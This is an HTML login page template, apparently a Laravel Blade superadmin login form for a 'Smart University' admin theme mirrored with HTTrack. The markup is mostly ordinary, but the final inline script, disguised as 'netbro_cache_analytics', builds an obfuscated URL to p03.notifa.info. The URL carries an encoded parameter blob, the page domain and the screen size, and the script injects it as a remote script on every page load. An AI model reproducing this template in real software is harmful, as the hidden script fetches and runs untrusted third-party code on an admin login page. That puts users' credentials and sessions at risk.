
<!DOCTYPE html>
<html>


<!-- Mirrored from radixtouch.in/templates/admin/smart/source/dark/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Mar 2020 06:04:39 GMT -->
<<head>
    <meta charset="utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="width=device-width, initial-scale=1" name="viewport"/>
    <meta name="description" content="Responsive Admin Template"/>
    <meta name="author" content="RedstarHospital"/>
    <title>Smart University | Bootstrap Responsive Admin Template</title>
    <!-- google font -->
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700&amp;subset=all" rel="stylesheet"
          type="text/css"/>
    <!-- icons -->
    <link href="{{asset('assets/css/font/css/font-awesome.min.css')}}" rel="stylesheet" type="text/css"/>
    <link rel="stylesheet" href="{{asset('assets/plugins/iconic/css/material-design-iconic-font.min.css')}}">
    <!-- bootstrap -->
    <link href="{{asset('assets/plugins/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet" type="text/css"/>
    <!-- style -->
    <link rel="stylesheet" href="{{asset('assets/css/pages/extra_pages.css')}}">
    <!-- favicon -->
    <link rel="shortcut icon" href="http://radixtouch.in/templates/admin/smart/source/assets/img/favicon.ico"/>
</head>

<body>
<div class="limiter">
    <div class="container-login100 page-background">
        <div class="wrap-login100">
            <form class="login100-form validate-form" method="POST" action="{{ route('superadmin.login.submit') }}">
                @csrf
                <span class="login100-form-logo">
						<img alt="" src="{{asset('assets/img/1.jpg')}}">
					</span>
                <span class="login100-form-title p-b-34 p-t-27">
						Log in
					</span>

                @if($message = Session::get('error'))
                    <div class="alert alert-danger alert-dismissible mb-2" role="alert">
                        <button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
                        {{$message}}
                    </div>
                @endif
                <div class="wrap-input100 validate-input" data-validate="Enter Email">
                    <input class="input100  @error('email') is-invalid @enderror" type="email" name="email"
                           value="{{ old('email') }}" placeholder="email">
                    @error('email')
                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                    @enderror
                    <span class="focus-input100" data-placeholder="&#xf207;"></span>
                </div>
                <div class="wrap-input100 validate-input" data-validate="Enter password">
                    <input class="input100 @error('password') is-invalid @enderror"
                           type="password" name="password" placeholder="Password">
                    @error('password')
                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                    @enderror
                    <span class="focus-input100" data-placeholder="&#xf191;"></span>
                </div>
                <div class="contact100-form-checkbox">
                    <input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
                    <label class="label-checkbox100" for="ckb1">
                        Remember me
                    </label>
                </div>
                <div class="container-login100-form-btn">
                    <button class="login100-form-btn">Login</button>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- start js include path -->
<script src="{{asset('assets/plugins/jquery/jquery.min.js')}}"></script>
<!-- bootstrap -->
<script src="{{asset('assets/plugins/bootstrap/js/bootstrap.min.js')}}"></script>
<script src="{{asset('assets/js/pages/extra-pages/pages.js')}}"></script>
<!-- end js include path -->
<script type="text/javascript">if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXbzwnIHA%2fXb4MEvQJtAiVbxuI4%2bE30FQARemIdAnrcxq4hDdDgtWOF4eHLHrG6JbNqwTboDJBZUHZFNVI5%2bPSSD2SRA4c1EC1Ikutj1cXCVIlSXe658ygP7Ner8X%2fKC%2fZpff3pX5LEmNqQEFe5mv51P7mIXvfcUQHRl%2bHXPvTinqFLtc1Ov34eOg7TFoPtTsoBU7U1wiMvUnMP7NWltoNHOKknxO%2frLymHefrALUeZVdEZBwgSG98mI4DTea0Wx0HjsuAn9o%2fns7AZc9aMvFc4z7WrGJpDyk7Cqz8bO7wM6PpF%2b0AA%2ffUoSP8h1CfK5G1p6upulNFnccKjmD4UblaHRajkDtIoGNc6vPcALXizkQ3V42K1yrHumJp6BEBHjV8d0DvR9QWsvPeWvQj8Ww21koXL8%2fYiRx2WJSBsDHRcYFyP66%2fHuS8JRK8MdRPVXho7HaMaqoOGV%2bXxbeBvmP0SnE6rHKt6sUgvlcaIYyExIkY1ph4Dv6bdv%2fL5CnuoYQP" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
    ;</script>
</body>


<!-- Mirrored from radixtouch.in/templates/admin/smart/source/dark/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Mar 2020 06:04:46 GMT -->
</html>